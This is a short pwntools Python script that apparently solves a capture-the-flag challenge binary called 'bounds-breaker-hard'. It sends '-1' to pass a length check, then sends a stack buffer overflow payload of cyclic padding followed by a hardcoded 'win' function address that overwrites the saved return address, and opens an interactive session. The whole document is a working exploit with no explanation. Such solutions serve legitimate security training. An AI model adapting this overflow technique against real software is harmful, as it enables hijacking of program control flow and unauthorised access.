#!/usr/bin/python3

from pwn import *
import time

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/bounds-breaker-hard')

rbp_addr = 0x7fff89c12480
input_start  = rbp_addr - 0x40
return_addr = rbp_addr + 8
overflow_size = return_addr - input_start
win_addr = 0x00000000004015fc

io = process()

payload = cyclic(overflow_size) + p64(win_addr)

io.sendline(b"-1")

time.sleep(1)

io.send(payload)

io.interactive()
